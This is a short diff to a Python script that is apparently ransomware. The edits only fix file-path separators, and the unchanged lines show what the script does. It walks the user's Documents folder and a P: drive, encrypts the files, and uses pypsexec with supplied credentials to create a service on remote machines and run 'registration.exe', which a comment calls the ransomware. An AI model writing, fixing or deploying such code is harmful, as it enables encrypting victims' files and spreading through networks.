@@ -9,7 +9,7 @@ from pypsexec.client import Client #Sending remote commands
 
 #Walkthrough the Documents folder and the P: drive
 def fileWalk():
-    path= "C:\\Users\\IEUsers\\Documents"
+    path= "C:/Users/IEUsers/Documents"
     files=[]
     for r, d, f in os.walk(path):
         for file in f:
@@ -19,7 +19,7 @@ def fileWalk():
     fileWalkP()
 
 def fileWalkP():
-    path= "P:\\"
+    path= "P:/"
     files=[]
     for r, d, f in os.walk(path):
         for file in f:
@@ -41,7 +41,7 @@ def encrypt(fileLocation):
 
 #play video
 def playVideo():
-    os.system("cd C:\\Users\\IEUser\\Downloads\Registration\Iam.mp4")
+    os.system("cd C:/Users/IEUser/Downloads/Registration/Iam.mp4")
     #CHANGE BACKGROUD
 
 
@@ -77,7 +77,7 @@ def remoteExecute(ipAddress, user, password):
     c.connect()
     try:
         c.create_service()
-        stdout, stderr, rc = c.run_executable("P:\\Registration\registration.exe") #Execute ransomware from P Drive
+        stdout, stderr, rc = c.run_executable("P:\\Registration\\registration.exe") #Execute ransomware from P Drive
     except:
         print("done")
 
